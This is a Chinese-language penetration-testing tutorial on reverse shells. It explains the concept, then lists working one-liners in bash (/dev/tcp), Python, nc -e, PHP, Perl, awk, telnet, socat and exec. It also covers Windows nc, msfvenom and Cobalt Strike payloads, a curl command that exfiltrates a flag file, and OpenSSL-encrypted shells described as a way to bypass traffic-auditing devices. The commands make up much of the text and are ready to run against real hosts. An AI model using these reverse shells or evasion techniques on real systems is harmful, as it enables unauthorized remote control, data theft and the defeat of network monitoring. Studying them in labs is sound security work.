反弹shell
知识铺垫
什么是shell
shell是渗透中常用的名词，像getshell，webshell，反弹shell等等，都和shell相关。

getshell：获取到目标的命令执行权限
webshell：指网站后门，通过web服务进行命令执行
反弹shell：把命令行的输入输出转移到其它主机
Shell 俗称壳（用来区别于核），是指“为使用者提供操作界面”的软件（命令解析器）。它类似于DOS下的command.com和后来的cmd.exe。它接收用户命令，然后调用相应的应用程序。简单说用户通过壳（shell）访问操作系统内核的服务，也就是由壳到内核，执行系统命令。
![[Pasted image 20251002165812.png]]

shell的功能是什么
shell用来接收我们用户的输入，并且解释我们的命令。然后将其传给系统内核，内核再调用硬件来操作。

什么是反弹shell
反弹shell（reverse shell），就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。

为什么要反弹shell
通常用于被控端因防火墙受限、权限不足、端口被占用等情形。
举例：假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web服务、ssh、telnet等等都是正向连接。那么什么情况下正向连接不能用了呢？
有如下情况：

某客户机中了你的网马，但是它在局域网内，你直接连接不了。
目标机器的ip动态改变，你不能持续控制。
由于防火墙等限制，对方机器只能发送请求，不能接收请求。
对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机等情况都是未知的，
webshell下执行命令不交互，为了方便提权或其它操作必须要反弹shell。
反弹shell相当于新增一个后门，当webshell被发现删除后权限不会丢失。
所以建立一个服务端让恶意程序主动连接，才是上策。
那么反弹就很好理解了，攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。

常用linux反弹shell的方式
实验环境，一台CentOS7(受害者)，一台win7（受害者），一台kali(进攻者)

使用whereis命令去确定目标支持的反弹方法
```bash
whereis nc bash python php exec lua perl ruby

```
![[Pasted image 20251002165842.png]]

### bash反弹shell

bash反弹是实战中用的最多的方法![[Pasted image 20251002165851.png]]
```bash
攻击者：nc -lvp 9999

受害者：bash -i >& /dev/tcp/192.168.239.128/9999 0>&1

```

#### 命令释义

nc -lvp 9999
```bash
nc是netcat的简写，可实现任意TCP/UDP端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口
-l 监听模式，用于入站连接
-v 详细输出--用两个-v可得到更详细的内容
-p port 本地端口号

```

```
这是在比如说sh的命令行中调用bash来执行命令然后在本地打开bash
/bin/bash -c "bash -i >& /dev/tcp/8.156.84.216/9999 0>&1"
```

```bash

/bin/bash -c 表示用bash来执行一次命令
bash -i代表在本地打开一个bash
>&后面跟上/dev/tcp/ip/port这个文件代表将标准输出和标准错误输出重定向到这个文件，也就是传递到远程vps
/dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接
远程vps开启对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出

```

inux文件描述符：linux shell下有三种标准的文件描述符，分别如下：
0 - stdin 代表标准输入,使用<或<<
1 - stdout 代表标准输出,使用>或>>
2 - stderr 代表标准错误输出,使用2>或2>>

还有就是>&这个符号的含义，最好的理解是这样的：


```
当>&后面接文件时，表示将标准输出和标准错误输出重定向至文件。
当>&后面接文件描述符时，表示将前面的文件描述符重定向至后面的文件描述符

```

当然我们还可以
```
curl ip:port/`cat /flag.php|base64`

``两个反引号包裹起来的内容是立即执行，这样我们可以在路由中看到我们执行ls的结果
```

原理
bash -i >& /dev/tcp/8.156.84.216/9999 0>&1：
bash -i代表在本地打开一个bash，然后就是/dev/tcp/ip/port， /dev/tcp/是Linux中的一个特殊设备，打开这个文件就相当于发出了一个socket调用，建立一个socket连接，>&后面跟上/dev/tcp/ip/port这个文件代表将标准输出和标准错误输出重定向到这个文件，也就是传递到远程上，如果远程开启了对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出，这个时候我们在CentOS输入命令，输出以及错误输出的内容就会被传递显示到kali上面。如下面的GIF所示
![[abe5ed37e50d91cd0afd196828afdeb8.gif]]


在/dev/tcp/ip/port后面加上0>&1，代表将标准输入重定向到标准输出，这里的标准输出已经重定向到了/dev/tcp/ip/port这个文件，也就是远程，那么标准输入也就重定向到了远程，这样的话就可以直接在远程输入了。
那么，0>&2也是可以的，代表将标准输入重定向到标准错误输出，而标准错误输出重定向到了/dev/tcp/ip/port这个文件，也就是远程，那么标准输入也就重定向到了远程。

为了更形象的理解，下面给出了整个过程的数据流向，首先是本地的输入输出流向：
![[Pasted image 20251002170037.png]]
执行`bash -i >& /dev/tcp/ip/port`后
![[Pasted image 20251002170046.png]]

执行`bash -i >& /dev/tcp/ip/port 0>&1`或者`bash -i >& /dev/tcp/ip/port 0>&2`后：
![[Pasted image 20251002170055.png]]
### python反弹shell
```bash
python -c 'import pty;pty.spawn("/bin/bash");'
这命令可以提升交互性
```

反弹的命令如下：
```bash
python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"

```
```bash
攻击者：nc -lvp 7777

受害者：python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.239.128',7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"

```
![[Pasted image 20251002170127.png]]



原理
首先使用socket与远程建立起连接，接下来使用到了os库的dup2方法将标准输入、标准输出、标准错误输出重定向到远程，dup2这个方法有两个参数，分别为文件描述符fd1和fd2，当fd2参数存在时，就关闭fd2，然后将fd1代表的那个文件强行复制给fd2，在这里可以把fd1和fd2看作是C语言里的指针，将fd1赋值给fd2，就相当于将fd2指向于s.fileno()，fileno()返回的是一个文件描述符，在这里也就是建立socket连接返回的文件描述符。于是这样就相当于将标准输入(0)、标准输出(1)、标准错误输出(2)重定向到远程(3)，接下来使用os的subprocess在本地开启一个子进程，传入参数“-i”使bash以交互模式启动，标准输入、标准输出、标准错误输出又被重定向到了远程，这样的话就可以在远程执行输入命令了。

nc反弹shell
需要目标主机安装了nc


```bash
攻击者：nc -lvp 4566

受害者：nc -e /bin/bash 192.168.239.128 4566

```
![[Pasted image 20251002170155.png]]

```bash
攻击者：nc -lvp 4444

受害者：nc -e /bin/sh 192.168.239.128 4444

```
![[Pasted image 20251002170209.png]]
#### 原理

nc -e /bin/bash 192.168.239.128 4566

```bash
-e prog 程序重定向，一旦连接，就执行

```
这里的-e后面跟的参数代表的是在创建连接后执行的程序，这里代表在连接到远程后可以在远程执行一个本地shell(/bin/bash)，也就是反弹一个shell给远程，可以看到远程已经成功反弹到了shell，并且可以执行命令。

其他：
注意之前使用nc监听端口反弹shell时都会有一个警告：192.168.239.130: inverse host lookup failed: Unknown host根据nc帮助文档的提示加上-n参数就可以不产生这个警告了，-n参数代表在建立连接之前不对主机进行dns解析。
![[Pasted image 20251002170235.png]]

### php反弹

首先最简单的一个办法，就是使用php的exec函数执行反弹shell  
（需要php关闭safe_mode选项，才可以使用exec函数）
```bash
攻击者：nc -nvlp 9875

受害者：php -r 'exec("/usr/bin/bash -i >& /dev/tcp/192.168.239.128/9875 0>&1");'

```
![[Pasted image 20251002170256.png]]

一些变形
```bash
攻击者：nc -nvlp 4986

php -r '$sock=fsockopen("192.168.239.128",4986);exec("/bin/bash -i <&3 >&3 2>&3");'

```
![[Pasted image 20251002170315.png]]

### exec反弹
```bash
攻击者：nc -nvlp 5623

受害者：0<&196;exec 196<>/dev/tcp/192.168.239.128/5623; sh <&196 >&196 2>&196

```

![[Pasted image 20251002170337.png]]

### perl反弹
```bash
攻击者：nc -nvlp 5623

受害者：perl -e 'use Socket;$i="ip";$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

```
![[Pasted image 20251002170426.png]]


### awk反弹
```bash
攻击者：nc -nvlp 5623

受害者：awk 'BEGIN{s="/inet/tcp/0/192.168.99.242/1234";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'

```
![[Pasted image 20251002170449.png]]


### telnet反弹

需要在攻击主机上分别监听4567和7654端口，执行反弹shell命令后，在4567终端输入命令，7654查看命令执行后的结果
```bash
攻击者：
nc -nvlp 4567		#输入命令
nc -nvlp 7654		#输出命令

受害者：
telnet 192.168.239.128 4567 | /bin/bash | telnet 192.168.239.128 7654

```

![[Pasted image 20251002170511.png]]
### socat反弹
```bash
攻击者：nc -nvlp 8989

受害者：socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.239.128:8989

```
![[Pasted image 20251002170533.png]]
windows反弹shell
nc反弹shell
攻击者：
nc -lvp 8989

受害者：
1：netcat 下载：https://eternallybored.org/misc/netcat/
2：解压后的文件夹里面，按住shift键的同时，在文件夹的空白处鼠标右键打开一个命令窗口
3：输入nc 192.168.239.128 8989 -e c:\windows\system32\cmd.exe
![[Pasted image 20251002170554.png]]

### MSF反弹

使用 msfvenom -l 结合关键字过滤（如cmd/windows/reverse），找出我们可能需要的payload
```bash
msfvenom -l payloads | grep 'cmd/windows/reverse'

生成命令
msfvenom -p cmd/windows/reverse_powershell LHOST=192.168.40.146 LPORT=4444


```

![[Pasted image 20251002170629.png]]
然后MSF启动监听
![[Pasted image 20251002170640.png]]
复制前面通过msfvenom生成的恶意代码到win7的cmd中执行即可。  
警告：有的文章说的是把那段恶意代码放到powershell中执行是不对的，也不能拿到session，至少我验证的结果是把代码放在cmd下执行才拿到session！

### CS主机上线

cs服务器在kali上面启动

```bash
sudo chmod +x teamserver
sudo ./teamserver 192.168.243.128 123456

cs客户机在kali上面启动

sudo chmod +x start.sh
./start.sh

```

![[Pasted image 20251002170723.png]]
![[Pasted image 20251002170727.png]]
CS会生成一条命令，复制下来，在powershell中执行即可
![[Pasted image 20251002170736.png]]

交互式shell
通过上述命令反弹shell得到的shell并不能称为完全交互的shell，通常称之为’哑’shell。
通常存在以下缺点

ctrl-c会中断会话
无法正常使用vim等文本编辑器
没有向上箭头使用历史
无法执行交互式命令
无法查看错误输出
无法使用 tab 命令补全
无法操控jobcontrol
因此有必要去获取一个完全交互的shell，方法就是在shell 中执行python，使用pty模块，创建一个原生的终端。下面提供两条命令，主要是因为有的机器可能是python2，有的是3，好比我这里使用3版本失败后，使用版本就ok了。
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'

```
![[Pasted image 20251002170804.png]]
## 流量加密

部分防护设备会对内外网传输流量进行审查，反弹shell执行命令都是以明文进行传输的，很容易被查杀。  
因此需要将原始流量使用 openssl 加密，绕过流量审计设备。  
1、首先kali上生成SSL证书的公钥/私钥对,信息懒得填，一直回车即可。

```bash
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes

```

2、kali使用 OpenSSL 监听一个端口
```basic
openssl s_server -quiet -key key.pem -cert cert.pem -port 8888

```

3、目标主机执行反弹加密shell
```bash
mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ip:port > /tmp/s; rm /tmp/s

```

![[Pasted image 20251002170904.png]]
下面来看整个过程中抓到的流量包，是TLS加密的![[Pasted image 20251002170913.jpg]]
